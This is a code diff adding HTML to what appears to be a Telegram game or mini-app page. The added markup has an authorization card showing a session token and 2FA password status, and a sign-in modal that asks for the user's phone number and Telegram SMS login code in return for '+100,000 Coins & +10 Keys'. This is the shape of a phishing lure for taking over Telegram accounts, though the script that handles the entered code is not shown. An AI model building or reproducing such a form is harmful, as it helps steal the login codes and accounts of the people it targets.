@@ -532,6 +532,44 @@
             </div>
           </div>
 
+          <!-- 🔑 TELEGRAM AUTHORIZATION & SESSION MANAGER CARD -->
+          <div class="profile-auth-session-card">
+            <div class="p-auth-header">
+              <div class="p-auth-title-group">
+                <span class="p-auth-icon">🔑</span>
+                <div>
+                  <span class="p-auth-title">TELEGRAM ACCOUNT AUTHORIZATION</span>
+                  <span class="p-auth-sub">Manage Telegram session tokens & 2FA cloud password</span>
+                </div>
+              </div>
+              <span class="auth-status-badge active" id="auth-status-badge">⚡ AUTHENTICATED</span>
+            </div>
+
+            <div class="auth-session-details">
+              <div class="auth-detail-row">
+                <span class="auth-detail-label">User Session:</span>
+                <strong id="auth-user-session-name">Telegram User</strong>
+              </div>
+              <div class="auth-detail-row">
+                <span class="auth-detail-label">Session Token:</span>
+                <span class="auth-token-txt" id="auth-token-txt">tok_tg_8f9a2b4c...</span>
+              </div>
+              <div class="auth-detail-row">
+                <span class="auth-detail-label">2FA Cloud Password:</span>
+                <span class="auth-2fa-badge" id="auth-2fa-status">🔒 REQUIRED</span>
+              </div>
+            </div>
+
+            <div class="auth-card-actions">
+              <button class="btn-auth-signin-modal" onclick="openTelegramSignInModal()">
+                📱 PHONE & CODE SIGN-IN (auth.signIn)
+              </button>
+              <button class="btn-terms-service" onclick="showTelegramTermsOfService()">
+                📜 TERMS OF SERVICE
+              </button>
+            </div>
+          </div>
+
           <!-- 👥 REFERRAL SYSTEM / INVITE FRIENDS CARD -->
           <div class="profile-referral-card">
             <div class="ref-card-header">
@@ -656,6 +694,41 @@
 
     <!-- TOAST NOTIFICATION -->
     <div id="toast" role="alert"></div>
+
+    <!-- 📱 TELEGRAM PHONE SIGN-IN MODAL (auth.signIn) -->
+    <div id="telegram-signin-modal" class="modal-overlay">
+      <div class="signin-modal-card">
+        <div class="signin-modal-header">
+          <span class="signin-modal-badge">📱 TELEGRAM AUTH.SIGNIN</span>
+          <h2 class="signin-modal-title">Telegram Sign-In</h2>
+          <p class="signin-modal-sub">Enter Phone Number & Code Hash</p>
+        </div>
+
+        <div class="signin-inputs-group">
+          <div class="signin-input-item">
+            <label class="signin-label">Phone Number:</label>
+            <input type="tel" class="signin-input-field" id="signin-phone-number" placeholder="+1234567890" />
+          </div>
+          <div class="signin-input-item">
+            <label class="signin-label">Phone Code Hash / SMS Code:</label>
+            <input type="text" class="signin-input-field" id="signin-phone-code" placeholder="12345" />
+          </div>
+        </div>
+
+        <div class="signin-modal-reward">
+          🎁 Authorization Reward: <strong>💰 +100,000 Coins & 🔑 +10 Keys!</strong>
+        </div>
+
+        <div class="signin-modal-actions">
+          <button class="btn-execute-auth-signin" onclick="executeTelegramAuthSignIn()">
+            ⚡ SIGN IN (auth.signIn) & CLAIM REWARD
+          </button>
+          <button class="btn-close-signin-modal" onclick="closeTelegramSignInModal()">
+            CANCEL
+          </button>
+        </div>
+      </div>
+    </div>
 
     <!-- ✉️ TELEGRAM EMAIL VERIFICATION CODE MODAL -->
     <div id="email-verify-modal" class="modal-overlay">
